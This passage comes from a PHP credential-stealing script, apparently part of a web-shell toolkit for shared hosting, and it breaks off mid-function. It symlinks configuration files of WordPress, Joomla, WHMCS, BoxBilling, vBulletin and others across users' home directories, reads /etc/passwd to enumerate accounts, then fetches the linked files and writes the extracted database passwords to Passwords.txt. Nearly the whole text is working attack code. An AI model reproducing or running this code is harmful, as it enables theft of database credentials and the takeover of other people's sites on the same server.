@symlink('/home9/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home9/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home9/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home9/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home9/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home9/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home 10

@symlink('/home10/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home10/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home10/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home10/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home10/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home10/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home10/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home10/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home10/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home10/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home10/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home10/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
}

//password grab

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien)
{

$ar0=explode($marqueurDebutLien, $text);
$ar1=explode($marqueurFinLien, $ar0[1]);
$ar=trim($ar1[0]);
return $ar;
}

$ffile=fopen('Passwords.txt','a+');


$r= 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME'])."/c7e_symconf/";
$re=$r;
$confi=array("-Wordpress.txt","-Joomla.txt","-WHMCS.txt","-Vbulletin.txt","-Other.txt","-Zencart.txt","-Hostbills.txt","-SMF.txt","-Drupal.txt","-OsCommerce.txt","-MyBB.txt","-PHPBB.txt","-IPB.txt","-BoxBilling.txt");

$users=file("/etc/passwd");
foreach($users as $user)
{

$str=explode(":",$user);
$usersss=$str[0];
foreach($confi as $co)
{


$uurl=$re.$usersss.$co;
$uel=$uurl;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $uel);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8');
$result['EXE'] = curl_exec($ch);
curl_close($ch);
$uxl=$result['EXE'];


if($uxl && preg_match('/table_prefix/i',$uxl))
{

//Wordpress

$dbp=entre2v2($uxl,"DB_PASSWORD', '","');");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}
elseif($uxl && preg_match('/cc_encryption_hash/i',$uxl))
{

//WHMCS

$dbp=entre2v2($uxl,"db_password = '","';");
if(!empty($dbp))
$pass=$dbp."\n";
fwrite($ffile,$pass);

}


elseif($uxl && preg_match('/dbprefix/i',$uxl))
{

//Joomla

$db=entre2v2($uxl,"password = '","';");
